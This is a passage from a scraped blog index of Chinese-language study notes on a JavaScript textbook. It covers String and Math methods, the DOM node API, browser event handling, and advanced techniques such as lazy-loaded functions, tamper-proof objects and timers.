对象在执行第三行代码时已经被销毁了。第三行代码又创建自已的 String 对象，而该对象没有 color 属性。\n当然，可以显式地调用 Boolean、Number 和 String 来创建基本包装类型的对象。不过，如非必要, 请不要这做，因为这种做法很容易让人分不清自已是在处理基本类型还是引用类型的值。\n基本类型和基本包装类型区别在于new产生的对象, 还能继续拥有属性和方法.\nObject 构造函数也会像工厂方法一样，根据传入值的类型返回相应基本包装类型的实例。例如：(同理传入number和boolean一样)var obj = new Object(\"some text\"); alert(obj instanceof String);\t//true\nBoolean只有一个建议: 不要用它的基本包装类型\nNumber略\nString有下列的一些方法:\n\n继承的方法:\nvalueOf\ntoLocaleString\ntoString\n\n\n字符方法:\ncharAt\ncharCodeAt\nString.fromCharCode, 此为静态方法. 与charCodeAt功能相反\n\n\n字符串操作方法:\nconcat\nslice\nsubstr\nsubstring\nlocaleCompare, 略\n\n\n字符串位置方法:\nindexOf\nlastIndexOf\n\n\n去除空格:\ntrim, 返回副本\n\n\n格式:\ntoLocaleUpperCase\ntoLocaleLowerCase\ntoUpperCase\ntoLowerCase\n\n\n字符串模式匹配方法:\nmatch, text.match(pattern)作用和pattern.exec(text) 相同\nsearch\nreplace, 常用语替换HTML字符串模板, 转义HTML符号\nsplit, 转数组\n\n\nHTML方法: 实现标签的嵌套:string\nanchor\nbig\nbold\nfixed\nfontcolor\nfontsize\nitalics\nlink\nsmall\nstrike\nsup\nsub\n\n\n\n单体内置对象由ECMAScript实现提供的、不依赖于宿主环境的对象，这些对象在程序执行之前就已经存在了。\nGlobal在浏览器中即window\n- URI编码\n    - encodeURI\n    - encodeURIComponent\n    - decodeURI\n    - decodeURIComponent\n- Eval: 在 eval()中创建的任何变量或函数都不会被提升，因为在解析代码的时候，它们被包含在一个字符串中；它们只在 eval()执行的时候创建。严格模式下不能赋值, 也不能访问到eval里面创建的函数或者变量\n- global对象的属性: 略\nMath\nMath的属性: 略\nMath.max和Math.minvar max = Math.max(3, 54, 32, 16); alert(max);  //54var min = Math.min(3, 54, 32, 16); alert(min);  //3//如果要求一个数组的最大值要怎么办呢?var values = [1, 2, 3, 4, 5, 6, 7, 8];Math.max.apply(null,values);\t//8, 前面函数方法那里, 讲了call/apply, 这里就是apply的基本功能\n\n\n\nPS: 基于这个, 我们可以出一个题目, 有多少种方法求数组的最大值?(自行思考)\n\n舍入方法\nMath.ceil, 向上取舍\nMath.floor, 向下取舍\nMath.round, 四舍五入\n\n\nMath.random: 最常用的方法之一\n其他方法: 看图","url":"/2019/03/26/JSbook05/","link":"","plink":"https://thinkerchan.com/2019/03/26/JSbook05/"},{"title":"JS红皮书读书笔记-10-DOM","content":"DOM即文档对象模型, 是针对HTML和XML的一个编程API, 主要功能是允许开发人员添加、移除和修改页面的某一部分。\n节点层次DOM以节点树的形式反映:&lt;html&gt;&lt;head&gt;  &lt;title&gt;Sample Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;p&gt;Hello World!&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\n以上就是一个最简单的DOM树结构.\n文档节点是每个文档的根节点。 在这个例子中，文档节点只有一个子节点，即元素. 称之为文档元素。文档元素是文档的最外层元素，文档中的其他所有元素都包含在文档元素中。每个文档只能有一个文档元素。在 HTML 页面中，文档元素始终都是元素。在 XML 中，没有预定义的元素，因此任何元素都可能成为文档元素。\n每一段标记都可以通过树中的一个节点来表示：HTML 元素通过元素节点表示，特性（attribute） 通过特性节点表示，文档类型通过文档类型节点表示，而注释则通过注释节点表示。总共有 12 种节点类型，这些类型都继承自一个基类型。\nNode类型DOM1 级定义了一个 Node 接口，该接口将由 DOM 中的所有节点类型实现。这个 Node 接口在JavaScript 中是作为 Node 类型实现的；除了 IE 之外，在其他所有浏览器中都可以访问到这个类型。JavaScript 中的所有节点类型都继承自 Node 类型，因此所有节点类型都共享若相同的基本属性和方法。每个节点都有一个 nodeType 属性，用于表明节点的类型。节点类型由在 Node 类型中定义的下列12 个数值常量来表示，任何节点类型必居其一：\n\nNode.ELEMENT_NODE(1)；\nNode.ATTRIBUTE_NODE(2)；\nNode.TEXT_NODE(3)；\nNode.CDATA_SECTION_NODE(4)；\nNode.ENTITY_REFERENCE_NODE(5)；\nNode.ENTITY_NODE(6)；\nNode.PROCESSING_INSTRUCTION_NODE(7)；\nNode.COMMENT_NODE(8)；\nNode.DOCUMENT_NODE(9)；\nNode.DOCUMENT_TYPE_NODE(10)；\nNode.DOCUMENT_FRAGMENT_NODE(11)；\nNode.NOTATION_NODE(12)。\n\n通过比较上面这些常量，可以很容易地确定节点的类型，例如：if (someNode.nodeType == Node.ELEMENT_NODE){  //在 IE 中无效  alert(\"Node is an element.\");}\n这个例子比较了 someNode.nodeType 与 Node.ELEMENT_NODE 常量。如果二者相等，则意味若someNode 确实是一个元素。然而，由于 IE 没有公开 Node 类型的构造函数，因此上面的代码在 IE 中会导致错误。为了确保跨浏览器兼容，最好还是将 nodeType 属性与数字值进行比较，如下所示：\nif (someNode.nodeType == 1){  //适用于所有浏览器  alert(\"Node is an element.\");}\n并不是所有节点类型都受到 Web 浏览器的支持。开发人员最常用的就是元素和文本节点。\n\nnodeName和nodeValue对于元素节点, nodeName保存的是元素的标签名, 如”DIV”,对于元素节点它们的nodeValue始终是null\n\n节点关系每个节点都有一个childNodes属性.其中保存若一个 NodeList 对象。NodeList 是一种类数组对象，用于保存一组有序的节点，可以通过位置来访问这些节点。请注意，虽然可以通过方括号语法来访问 NodeList 的值，而且这个对象也有 length 属性，但它并不是 Array 的实例。NodeList 对象的独特之处在于，它实际上是基于 DOM 结构动态执行查询的结果，因此 DOM 结构的变化能够自动反映在 NodeList 对象中。\n\n\nvar body = document.body;body.childNodes instanceof Array; // falsevar firstChild = body.childNodes[0];var secondChild = body.childNodes.item(1); var count = body.childNodes.length;\n前面我们讲了引用类型中数组, 有几个方法是可以操作数组实例并返回数组的, 比如slice, 如果要把类数组对象转换成熟组, 我们可以:\n// 推荐方式var arr = ([]).slice.call(arrayLikeObj);// 或者新建一个空数组, 循环arrayLikeObj把其中的项添加进空数组\n每个节点都有一个 parentNode 属性，该属性指向文档树中的父节点。包含在 childNodes 列表中的所有节点都具有相同的父节点，因此它们的 parentNode 属性都指向同一个节点。此外，包含在childNodes 列表中的每个节点相互之间都是同胞节点。通过使用列表中每个节点的 previousSibling 和 nextSibling 属性，可以访问同一列表中的其他节点。列表中第一个节点的 previousSibling 属性值为 null，而列表中最后一个节点的 nextSibling 属性的值同样也为 null .\n如果列表中只有一个节点，那么该节点的 nextSibling 和 previousSibling 都为 null。\nsomeNode.firstChild == someNode.childNodes[0]someNode.lastChild == someNode.childNodes[someNode.childNodes.length-1]\n如果没有子节点，那么 firstChild 和 lastChild 的值均为 null.\n另外，someNode.hasChildNodes()可以查询是否包含子节点. 所有节点都包含一个属性ownerDocument, 指向当前文档对象.\n\n操作节点前面的关系指针都是只读的, DOM还提供了一些列操作节点的方法:\n\n\nappendChild\n向childNodes里面添加最后一个节点, 如果要被添加的节点本身已经存在于文档当中, 那就会将原本的位置转移到新的位置 . 要记住, DOM树可以看做是一些列指针链接起来的文档模型. 只不过特殊的地方在于DOM节点不能出现在多个位置上\n\n\ninsertBefore\n用法: someNode.insertBefore(newNode, 参照节点)\n\n\nreplaceChild\n用法: someNode.replaceChild(newNode, 被替换的节点)\n\n\nremoveChild\n删除某个节点, 被删除的节点仍为文档所有, 只不过没有了位置\n\n\n\n\n其他操作\n\n\ncloneNode(bool)\n参数为非true的时候, 执行浅复制,反之深复制, 此方法返回一个新生成的副本, 如果不插入DOM树, 它相当于一个’孤儿’, 没有自己的位置, 但仍属于文档.\n\n\nnormalize\n可查阅 MDN- node.normalize \n\n\n\nDocument类型JavaScript 通过 Document 类型表示文档。在浏览器中，document 对象是 HTMLDocument（继承自 Document 类型）的一个实例，表示整个 HTML 页面。而且，document 对象是 window 对象的一个属性，因此可以将其作为全局对象来访问。\n\n文档的子节点虽然 DOM 标准规定 Document 节点的子节点可以是 DocumentType、Element、ProcessingIn-struction 或 Comment，但还有两个内置的访问其子节点的快捷方式。第一个就是 documentElement 属性，该属性始终指向 HTML 页面中的元素。另一个就是通过 childNodes 列表访问文档元素， 但通过 documentElement 属性则能更快捷、更直接地访问该元素。\n\n基本上最常用到:\n\ndocument.documentElement\ndocument.body\n\n\n文档信息\n\n\ndocument.title\ndocument.URL\ndocument.domain: 跨域方面能用到\ndocument.referrer\n\n\n查找元素由于HTML的容错性, 与标准不同, 实际上元素的签名是忽略大小写的, 但是我们依然要按照区别大小写的方式来开发.\n\n\ndocument.getElementById\ndocument.getElementsByTagName\ndocument.getElementsByName\ndocument.getElementsByClassName\n\n\n特殊集合\n\n\ndocument.anchors: 遍历带有name属性的a标签\ndocument.applets: 已废弃\ndocument.forms: 页面所有表单\ndocument.links: 所有带href的标签\n\n\nDOM一致性检测document.hasFeature用于检测DOM是否支持某些功能, 但是实际开发上我们很少用这个API(直接用特征检测更好),故不再讲解.\n\n文档写入有以下几个方法:\n\n\n\ndocument.wirte: 这个方法通常用来写入外部脚本, 不建议使用这个API, 会阻塞网页和带来性能问题\ndocument.wirteLn: 和wirte类似, 但行末会添加换行符(\\n)\ndocument.open: 使用document.wirte的时候会自动执行这个方法\ndocument.close: 如果不使用这个方法, document.wirte能继续在原有文档上添加内容, 否侧document.wirte会重新清空文档\n\nElement类型除了document类型, element类型就是开放人员最常用的了.\n\nHTML元素HTML元素基本具备以下属性:\n\n\nid\ntitle\nlang\ndir\nclass\nalign\n\n\n读写属性(特性)主要是以下三个方法:\n\n\nele.getAttribute(属性名): 通常开发者用点运算符访问或者方括号访问\nele.setAttribute(属性名, 值)\nele.removeAttribute(属性名)\n\n\nattributes属性ele. attributes返回一个类数组对象, 罗列该元素有的属性, 但是也能使用ele. attributes[属性名]代替ele.getAttribute(‘属性名’)\n\n创建元素document.createElement\n\n元素的子节点略\n\n\nText类型略, 通常开发者用innerHTML或者innerText代替这个功能\nComment类型注释类型, 略\nCDATASection类型此类型针对XML, 略\nDocumentType类型几乎不用, 略\nDocumentFragment类型documentFragment类型在文档中没有对应的标记, 你可以理解成它是文档之外的一个”独立仓库”, 不占用额外的资源.\n假如我们要给一个ul元素插入多个li元素, 按照正常思路:function buildLi(){  var li = document.createElement('li');  li.innerText = 'new li';  return li;}for (var i = 0; i &lt; 10; i++) {  Jul.appendChild(buildLi())}\n虽然上面的代码功能上没有问题, 但是导致浏览器的反复渲染. 为了尽可能地减少这种渲染开销, 我们可以利用documentFragment来实现:\nfunction buildLi(){  var li = document.createElement('li');  li.innerText = 'new li';  return li;}var frag = document.createDocumentFragment();for (var i = 0; i &lt; 10; i++) {  frag.appendChild(buildLi())}Jul.appendChild(frag);\t//只渲染了一次\nAttr类型略, 它不被认为是DOM文档树的一部分\nDOM操作技术动态脚本即动态创建script元素, 再将script元素插到html中, 此为异步加载\n动态样式即动态创建link元素, 再将link元素插到html中,此为异步加载\n操作表格操作表格的API不十分常用, 略\n使用NodeList除了nodeList(childNodes产生), 还有nodeNameMap(例如document.links产生), HTMLCollection(例如获取dom元素产生), 使用它们的时候尽可能缓存起来, 因为它们都是动态的, 实时更新. 这意味着开销的变大.\n如果你将nodeList长度作为循环判断的截止条件, 那有可能会陷入无限循环.\nvar divs = document.getElementsByTagName(\"div\"),  i,  div;for (i=0; i &lt; divs.length; i++){  div = document.createElement(\"div\");   document.body.appendChild(div);}\n\n本章完","url":"/2019/03/28/JSbook10/","link":"","plink":"https://thinkerchan.com/2019/03/28/JSbook10/"},{"title":"JS红皮书读书笔记-13-事件","content":"HTML和JS之间的交互, 就是通过事件实现的.\n事件流事件流描述的是从页面中接收事件的顺序.  有冒泡和捕获两种事件处理方式, 提出者为微软和网景.\n事件冒泡IE 的事件流叫做事件冒泡（event  bubbling），即事件开始时由最具体的元素（文档中嵌套层次最深的那个节点）接收，然后逐级向上传播到较为不具体的节点（文档）。\n我们看这个例子:\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;Event Bubbling Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=\"myDiv\"&gt;Click Me&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n按照IE的逻辑, 你点击#myDive会经过一下历程:\n\ndiv#myDiv -&gt; body -&gt; html -&gt; document\n\n\n此图形象地描述了什么是冒泡\n事件捕获与冒泡相反的就是事件捕获, 还是用上面那个HTML页面做例子:\n按照事件捕获的逻辑, 你点击#myDive会经过一下历程:\n\ndocument -&gt; html -&gt; body -&gt; div#myDiv\n\n\n此图形象地描述了什么是捕获\nDOM事件流“DOM2级事件＂规定的事件流包括三个阶段：事件捕获阶段、处于目标阶段和事件冒泡阶段。首先发生的是事件捕获，为截获事件提供了机会。然后是实际的目标接收到事件。最后一个阶段是冒泡阶段，可以在这个阶段对事件做出响应。\n\n一句话总结: DOM事件流会先触发捕获,再触发冒泡\n\n我们看一个例子:\n&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" id=\"html\"&gt;&lt;head&gt;  &lt;meta charset=\"UTF-8\"&gt;  &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body id=\"body\"&gt;  &lt;div id=\"mydiv\"&gt;click me&lt;/div&gt;  &lt;script&gt;    html.addEventListener('click', ()=&gt;{      console.log('html.capture')    }, true)    html.addEventListener('click', ()=&gt;{      console.log('html.bubble')    }, false)    body.addEventListener('click', ()=&gt;{      console.log('body.capture')    }, true)    body.addEventListener('click', ()=&gt;{      console.log('body.bubble')    }, false)    mydiv.addEventListener('click', ()=&gt;{      console.log('mydiv.capture')    }, true)    mydiv.addEventListener('click', ()=&gt;{      console.log('mydiv.bubble')    }, false)  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n结果如下:\n事件处理程序可以理解成响应某种动作的函数, 比如说click事件自然对应onClick. 等等\nHTML事件处理程序即在HTML里面直接使用诸如onClick之类的事件, 现在已经不推荐使用, 主要原因如下:\n\n代码耦合\n未加载完所有资源就激活了事件导致报错\n\nDOM0事件处理程序我们来看一个例子:var btn = document.getElementById(\"myBtn\"); btn.onclick = function(){  alert(this.id); //\"myBtn\", 注意这里的this};//btn.onclick = function(){  // console.log('dom02次绑定会覆盖')//};\n这就是通常见到的DOM0事件处理程序, 它的优势在于兼容IE浏览器, 缺点在于不能对同一个元素绑定相同的事件, 否则后面的会覆盖前面的事件处理程序\nDOM2事件处理程序“DOM2 级事件＂定义了两个方法，用于处理指定和删除事件处理程序的操作：addEventListener()和 removeEventListener()。所有 DOM 节点中都包含这两个方法，并且它们都接受 3 个参数：要处理的事件名、作为事件处理程序的函数和一个布尔值。最后这个布尔值参数如果是 true，表示在捕获阶段调用事件处理程序；如果是 false，表示在冒泡阶段调用事件处理程序。\n那么DOM0那个例子可以改写成:var btn = document.getElementById(\"myBtn\");btn.addEventListener(\"click\", function(){   alert(this.id);\t//注意这里的this}, false);btn.addEventListener(\"click\", function(){   alert('repeat');\t// 'repeat'}, false);\nDOM2能按顺序正常触发绑定的重复事件处理程序.\n我们知道函数是引用类型的实例, 即使是匿名函数也不等于另一个匿名函数, 所以使用removeEventListener的时候, 第二个参数必须是一个函数名才有意义, 否则无效.\nIE事件处理程序IE也实现了和DOM2类似的两个方法, 分别是attachEvent和detachEvent.但只支持冒泡.所以只有两个参数, 我们看下面的例子:\nvar btn = document.getElementById(\"myBtn\");btn.attachEvent(\"onclick\", function(){ // 注意第一个参数是有on前缀的  alert(this === window);\t//注意这里的this不是某个html元素的引用});btn.attachEvent(\"onclick\", function(){  alert('btn.attachEvent2'); // 它也是可以重复添加相同事件处理程序的});\n\n值得注意的是, attachEvent添加多个同类事件处理程序, 是逆序执行的. 同样, detachEvent的第二个参数也是要一个函数名才有意义.\n\n跨浏览器的事件处理程序既然要兼容IE和标准浏览器:var EventUtil = {  addHandler: function(element, type, handler){     if (element.addEventListener){      element.addEventListener(type, handler, false);    } else if (element.attachEvent){       element.attachEvent(\"on\" + type, handler);    } else {      element[\"on\" + type] = handler;    }  },  removeHandler: function(element, type, handler){     if (element.removeEventListener){      element.removeEventListener(type, handler, false);    } else if (element.detachEvent){       element.detachEvent(\"on\" + type, handler);    } else {      element[\"on\" + type] = null;    }  }};\n兼容思路: \n\nDOM2 -&gt; IE -&gt; DOM0\n\n事件对象在触发 DOM 上的某个事件时，会产生一个事件对象 event，这个对象中包含若所有与事件有关的信息。包括导致事件的元素、事件的类型以及其他与特定事件相关的信息。例如，鼠标操作导致的事件对象中，会包含鼠标位置的信息，而键盘操作导致的事件对象中，会包含与按下的键有关的信息。所有浏览器都支持 event 对象，但支持方式不同\nDOM中的事件对象兼容 DOM 的浏览器会将一个 event 对象传入到事件处理程序中。无论指定事件处理程序时使用什么方法（DOM0 级或 DOM2 级），都会传入 event 对象。来看下面的例子:\nvar btn = document.getElementById(\"myBtn\");btn.onclick = function(event){   alert(event); };btn.addEventListener(\"click\", function(event){   alert(event.type);}, false);\n可以用for-in循环枚举出事件对象的熟悉和方法,这里只列几个常用的属性和方法:\n\npreventDefault(): 阻止默认行为, 例如禁止a标签跳转href\ncurrentTarget: 略\nstopPropagation(): 阻止事件继续捕获或者冒泡 \ntype: 事件类型\n\nIE中的事件对象IE中DOM0事件的话, 则用window.event访问var btn = document.getElementById(\"myBtn\");btn.onclick = function(){\t// DOM0事件  var event = window.event; \talert(event.type);  //\"click\"};\nIE中DOM2事件则与标准浏览器相同\n跨浏览器的事件对象主要兼容思路:var event =  event ? event : window.event\n事件类型UI事件常见UI事件如下:\n\nload\nunload\nabort\nerror\nselect\nresize\nscroll\n\n焦点事件常见焦点事件如下:\n\nblur\nfocus\n\n鼠标滚轮事件常见鼠标滚轮事件如下:\n\nclick\ndblclick\nmousedown\nmouseenter\nmouseleave\nmousemove\nmousemout\nmousemover\nmouseup\nmousewheel\n\n键盘文本事件常见键盘文本事件如下:\n\nkeydown\nkeypress\nkeyup\ntextInput\n\n复合事件这个符合事件的存在主要解决输入法输入的时候”有效输入”的问题, 可以看这篇文章, 会更好理解: https://github.com/julytian/issues-blog/issues/15 \n\ncompositionstart\ncompositionupdate\ncompositionend\n\n变动事件通常指页面的某个节点在以下集中情况触发的事件:\n\n删除节点\n插入节点\n\n对应的事件:\n\nDOMSubtreeModified\nDOMNodeInserted\nDOMNodeRemove\nDOMNodeInsertedIntoDoucmnet\nDOMNodeRemovedFromDoucmnet\nDOMAttrModified\nDOMCharacterDataModified\n\n由于在日常开发中用得少, 这部份的讲解略过\nHTML5事件\ncontextmenu\nbeforeunload\nDOMContentLoaded\nreadystatechange: 它存在四种状态\nloading\nloaded\ninteractive\ncomplete\n\n\npageshow/pagehide\nhashchange: 挂载在window对象上, 主要用于URL变化检测\n\n设备事件主要设备事件如下:\n\norientationchange\ndeviceorientation: \ndevicemotion: 包含以下属性\nacceleration: 这个属性可以实现”摇一摇”的功能\naccelerationIncludingGravity\ninterval\nrotationRate\n\n\n\n有关这部分的知识可以参考 https://imweb.io/topic/56ab279be39ca21162ae6c75 , 会更为清晰.\n触摸和手势事件常用触摸事件:\n\ntouchstat\ntouchend\ntouchmove\ntouchcancel\n\n常用手势事件:略\n此节内容可以查看 https://segmentfault.com/a/1190000004332409 \n内存和性能假如你要对某个ul下的2个li添加点击事件 , 正常的思路自然会先获取一个li, 再添加事件处理程序, 同理再对第二个li进行类似处理. 这看起来也没什么问题.\n假如ul下有100个li呢? 逐一对li添加事件处理程序可不显示, 而且非常耗费内存和性能.\n事件委托针对上面描述的情况, 我们对li的父元素做一次绑定即可:var ul = document.getElementById('ul');ul.addeventListener('click',function  (event) {  switch (event.target.id) { //传入li的id    case 'id1':      // ...      break;    case 'id2':      // ...      break;    //...    default:      // ...      break;  }},false)\n这样性能会提高, 可维护性也会更好\n移除事件处理程序\n如果事件用完之后不需要再用了, 最好手动移除事件处理程序\n\n模拟事件DOM中的事件模拟略\nIE中的事件模拟略\n如需学习, 请查阅此处 https://segmentfault.com/a/1190000004339133 \n\n本章完","url":"/2019/04/09/JSbook13/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook13/"},{"title":"JS红皮书读书笔记-22-高级技巧","content":"高级函数安全类型的检测JavaScript 内置的类型检测机制并非完全可靠。事实上，发生错误否定及错误肯定的情况也不在少数。比如说 typeof 操作符吧，由于它有一些无法预知的行为，经常会导致检测数据类型时得到不靠谱的结果。var isArray = value instanceof Array;\n这个表达式要是想返回true，value必须是个数组，且必须与Array构造函数在同一个全局作用域中，如果value是另一个全局作用域(其他frame)中定义的数组，那这个表达式返回false。\n检测某个对象是原生的还是开发人员自定义的对象时也会有问题。因为浏览器开始原生支持JSON了，而有些开发人员还是在用第三方库来实现JSON，这个库里会有全局的JSON对象，这样想确定JSON对象是不是原生的就麻烦了。解决这些问题的办法就是使用Object的toString方法，这个方法会返回一个[object NativeConstructorName]格式的字符串。\nfunction isArray(value){  return Object.prototype.toString.call(value) == \"[object Array]\";}function isFunction(value){  return Object.prototype.toString.call(value) == \"[object Function]\";}function isRegExp(value){  return Object.prototype.toString.call(value) == \"[object RegExp]\";}\n不过要注意的是，对于在IE中任何以COM形式实现的函数，isFunction()都会返回false。对于JSON是否为原生的问题可以这样：var isNativeJSON = window.JSON &amp;&amp; Object.prototype.toString.call(JSON) == \"[object JSON]\";\n作用域安全的构造函数第六章的时候我们将了构造函数, 我们来回顾一下一个例子:function Person(name, age, job){    this.name = name;    this.age = age;    this.job = job;}var person = new Person(\"Nicholas\", 29, \"Software Engineer\");\n如果不使用new运算符, 那么name, age, job三个属性会被直接挂在到window对象上, 为了防止普通调用的过程中出现这种疏忽,  我们有必要做一道保险:function Person(name, age, job){    if (this instanceof Person){        this.name = name;        this.age = age;        this.job = job;    } else {        return new Person(name, age, job); //保险    }}var person1 = Person(\"Nicholas\", 29, \"Software Engineer\");alert(window.name);      //\"\"alert(person1.name);     //\"Nicholas\"var person2 = new Person(\"Shelby\", 34, \"Ergonomist\");alert(person2.name);     //\"Shelby\"\n加了这个判断之后,看起来更叫稳妥.\n不过又产生了新的问题, 假如Person函数调用call/apply实现继承的话, 那么结果可能不是我们想要的:function Polygon(sides){    if (this instanceof Polygon) {        this.sides = sides;        this.getArea = function(){            return 0;        };    } else {        return new Polygon(sides);    }}function Rectangle(width, height){    Polygon.call(this, 2);\t//这里的this传的是Rectangle的实例    this.width = width;    this.height = height;    this.getArea = function(){        return this.width * this.height;    };}var rect = new Rectangle(5, 10);alert(rect.sides);        //undefined\n解决方式:Rectangle.prototype = new Polygon();\t//原型链继承, 这样this就是Polygon的实例了var rect = new Rectangle(5, 10);alert(rect.sides);        //2\n惰性载入函数由于浏览器差异，大量的判断浏览器能力的函数需要被使用（通常是大量的if），然而这些判断一般其实不必每次都执行，在执行一次后，浏览器的能力就确定了，以后就应该不用在判断了。比如：function createXHR(){    if (typeof XMLHttpRequest != \"undefined\"){        return new XMLHttpRequest();    } else if (typeof ActiveXObject != \"undefined\"){        if (typeof arguments.callee.activeXString != \"string\"){            var versions = [\"MSXML2.XMLHttp.6.0\", \"MSXML2.XMLHttp.3.0\",                    \"MSXML2.XMLHttp\"],                i,len;            for (i=0,len=versions.length; i &lt; len; i++){                try {                    new ActiveXObject(versions[i]);                    arguments.callee.activeXString = versions[i];                    break;                } catch (ex){                }            }        }        return new ActiveXObject(arguments.callee.activeXString);    } else {        throw new Error(\"No XHR object available.\");    }}\n这里的创建XHR对象的函数，每次创建对象时都会判断一次浏览器能力，这是不必要的。\n惰性载入有两种方式. 第一种就是在函数第一次被调用时，根据不同情况，用不同的新函数把这个函数覆盖掉，以后调用就不需要再判断而是直接执行该执行的操作。function createXHR(){    if (typeof XMLHttpRequest != \"undefined\"){        createXHR = function(){            return new XMLHttpRequest();        };    } else if (typeof ActiveXObject != \"undefined\"){        createXHR = function(){            if (typeof arguments.callee.activeXString != \"string\"){                var versions = [\"MSXML2.XMLHttp.6.0\", \"MSXML2.XMLHttp.3.0\",                        \"MSXML2.XMLHttp\"],                        i, len;                for (i=0,len=versions.length; i &lt; len; i++){                    try {                        new ActiveXObject(versions[i]);                        arguments.callee.activeXString = versions[i];                        break;                    } catch (ex){                        //skip                    }                }            }            return new ActiveXObject(arguments.callee.activeXString);        };    } else {        createXHR = function(){            throw new Error(\"No XHR object available.\");        };    }    return createXHR();}createXHR();//第一次调用的时候会执行if语句createXHR();//第二次就不会执行if语句了\n第二种方法就是在声明函数时候就指定适当的函数, 实际上原理和上面的类似:\nvar createXHR = (function(){    if (typeof XMLHttpRequest != \"undefined\"){        return function(){            return new XMLHttpRequest();        };    } else if (typeof ActiveXObject != \"undefined\"){        return function(){            if (typeof arguments.callee.activeXString != \"string\"){                var versions = [\"MSXML2.XMLHttp.6.0\", \"MSXML2.XMLHttp.3.0\",                    \"MSXML2.XMLHttp\"],                    i, len;                for (i=0,len=versions.length; i &lt; len; i++){                    try {                        new ActiveXObject(versions[i]);                        arguments.callee.activeXString = versions[i];                        break;                    } catch (ex){                        //skip                    }                }            }            return new ActiveXObject(arguments.callee.activeXString);        };    } else {        return function(){            throw new Error(\"No XHR object available.\");        };    }})();\t//这里是一个立即执行函数, 执行完毕后createXHR就可以直接调用, 无需再检测\n函数绑定函数绑定是为了解决this的指向问题：var handler = {      message: \"Event handled\",      handleClick: function(event){        console.log(this);        console.log(this.message);      }    };    var btn = document.getElementById(\"myButton\");    btn.addEventListener('click', handler.handleClick, false);\t//这里会输出 dom 和 undefined, 表面上handler.handleClick是挂载在handler上, 但是它里面的this指向会发生改变// 为了解决上面的问题, 我们有如下两个方法:// 方法1: 新增匿名函数    btn.addEventListener('click', function(evt){      handler.handleClick(evt)\t// 通过新增一个匿名函数可以实期待的输出    }, false); // 方法2: 使用Es5 bind方法btn.addEventListener('click', handler.handleClick.bind(handler), false);// 如果浏览器不支持bind方法, 我们可以利用apply实现一个if(!Function.prototype.bind){  Function.prototype.bind = function(fn,context){    return function(){      fn.apply(context,arguments)    }  }}\n函数curry化函数curry化, 中文翻译柯里化, 个人觉得在大多数情况下不是很有必要.书上讲得也不好, 请直接观看 这篇文章讲解什么是curry化 \n防篡改对象不可扩展对象JS共享的本质使任意对象都可被随意修改。这样有时很不方便。ES5增加了几个方法来设置对象的行为。一旦将对象设置为防篡改就不能撤销了。var person = { name: \"Nicholas\" };Object.preventExtensions(person);\t\t//ES5新增的Object.preventExtensions方法person.age = 29;alert(person.age); //undefinedalert(Object.isExtensible(person)); //falseperson.name = \"hahah\";\t//可以对现有属性进行修改alert(person.name); //hahah\n密封的对象密封对象比不可扩展对象更加严格, 它不可以添加或删除属性，已有成员的[[Configurable]]特性被设置为false。\nvar person = { name: \"Nicholas\" };Object.seal(person);person.age = 29; alert(person.age); //undefineddelete person.name; \t//不能删除alert(person.name); //\"Nicholas\"alert(Object.isExtensible(person)); //false ,不能扩展alert(Object.isSealed(person));     //true\n冻结的对象Object.freeze, 比前面两个更加严格var person = { name: \"Nicholas\" };Object.freeze(person);person.age = 29; alert(person.age); //undefineddelete person.name; alert(person.name); //\"Nicholas\"person.name = \"Greg\"; alert(person.name); //\"Nicholas\"alert(Object.isExtensible(person));//falsealert(Object.isSealed(person));//truealert(Object.isFrozen(person));//true\n高级定时器setTimeout()和setInterval()是很实用的功能，不过有些事情是要注意的。JS是单线程的，这就意味着定时器实际上是很有可能被阻塞的。我们在这两个函数中所设置的定时，其实是代表将代码加入到执行队列的事件，如果在加入时恰巧JS是空闲的，那么这段代码会立即被执行，也就是说这个定时被准时的执行了。相反，如果这时JS并不空闲或队列中还有别的优先级更高的代码，那就意味着你的定时器会被延时执行。\n\n记住: 在JS中, 没有任何代码是立即执行的, 只有一旦进程空闲就执行.\n\n重复的定时器使用setInterval创建定时器的目的是使代码规则的插入到队列中。这个方式的问题在于，存在这样一种可能，在上次代码还没执行完的时候代码再次被添加到队列。JS引擎会解决这个问题，在将代码添加到队列时会检查队列中有没有代码实例，如果有就不添加，这确保了定时器代码被加入队列中的最小间隔是规定间隔。但是在某些特殊情况下还是会出现两个问题，某些间隔因为JS的处理被跳过，代码之间的间隔比预期的小。所以尽量使用setTimeout()模拟间隔调用。setTimeout(function(){     setTimeout(arguments.callee, interval);}, interval);\nyielding processes浏览器中的js被分配了一个确定数量的资源，所以会限制js脚本的运行时间，不能过长。\n如果达到这个限制，会弹出一个浏览器错误的对话框，询问是否继续执行。定时器时绕开此限制的方法之一。\n脚本长时间运行的原因有两个：\n\n过长的、过深嵌套的函数调用\n进行大量处理的循环\n\n通常我们是处理第二个因素, 但是要记住, 如果你的循环不必同步,或者结果不必按顺序, 那么么就可以采用yielding processes思想.\n我们看这例子:function chunk(array, process, context){    setTimeout(function(){        var item = array.shift();        process.call(context, item);        if (array.length &gt; 0){            setTimeout(arguments.callee, 100);        }    }, 100);}var data = [12,123,1234,453,436,23,23,5,4123,45,346,5634,2234,345,342];function printValue(item){    var div = document.getElementById(\"myDiv\");    div.innerHTML += item + \"&lt;br&gt;\";}chunk(data, printValue);\n函数节流举个例子 , 页面有一个长度为3的轮播图, 你鼠标放到(hover)对应轮播点的时候自动显示该张图, 如果你在非常短时间(比如10ms)内快速来回hover, 那图片自然也会也会快速闪烁, 这样会操作性能的浪费. 我们就可以利用setTimeout来限制用户的hover频率\n自定义事件事件是一种叫做观察者模的设计模式(也叫发布订阅模式), 这是一种创建松散耦合的代码技术.观察者模式有两类对象组成: 主体和观察者, 主体发布时间, 同时观察者通过订阅这些事件来观察主体. 涉及到DOM上, DOM元素就是主体, 你的事件处理程序就是观察者.\n我们来实现一个简单的观察者模式:var Pubsub = function  (argument) {      this.hub = {};    }    Pubsub.prototype.on = function(type,fn){      if (!this.hub[type]) {        this.hub[type] = [];      }      this.hub[type].push(fn);    };    